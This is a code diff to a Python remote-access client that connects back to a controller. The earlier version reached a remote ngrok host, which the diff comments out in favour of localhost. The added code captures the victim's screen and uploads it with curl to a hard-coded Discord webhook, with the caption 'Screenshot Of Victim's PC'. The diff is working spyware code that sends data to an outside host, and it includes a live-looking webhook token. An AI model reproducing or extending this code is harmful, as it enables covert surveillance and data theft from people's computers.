@@ -3,8 +3,8 @@ from typing import *
 import sys
 import os
 import webbrowser
-import discord_webhooks
 from PIL import ImageGrab
+import requests
 class Client():
     def __init__(self,c:socket.socket,addr:Tuple[str,int]) -> None:
         self.client=c
@@ -54,14 +54,15 @@ class Client():
         else:
             return "other"
     def send_screenshot_to_discord(self):
-        webhook=discord_webhooks.DiscordWebhooks("https://discord.com/api/webhooks/1048155720031420436/-ARmdlaFvJyb-6iKCWb-uNXIgO9M6zMbpt4MR85rfL8mqEIXXZr7we-L8XNG9aGSAORy")
-        webhook.set_footer(text="D A R K N E S S")
-        webhook.send()
+        ImageGrab.grab().save("screenshot.png")
+        _temp_path=os.path.join(os.getcwd(),"screenshot.png")
+        os.system(f"curl -F image=@{_temp_path} -F content=\"Screenshot Of Victim's PC\" \"POST\" \"https://discord.com/api/webhooks/1048155720031420436/-ARmdlaFvJyb-6iKCWb-uNXIgO9M6zMbpt4MR85rfL8mqEIXXZr7we-L8XNG9aGSAORy\"")
     @staticmethod
     def init_socket(_addr:str,_port:int) -> Tuple[socket.socket,Tuple[str,int]]:
         c=socket.socket()
         c.connect((_addr,_port))
         return c,_addr
 if __name__ == "__main__":
-    c,addr=Client.init_socket("0.tcp.in.ngrok.io",13472)
+    # c,addr=Client.init_socket("0.tcp.in.ngrok.io",13592)
+    c,addr=Client.init_socket("localhost",9999)
     client=Client(c,addr)
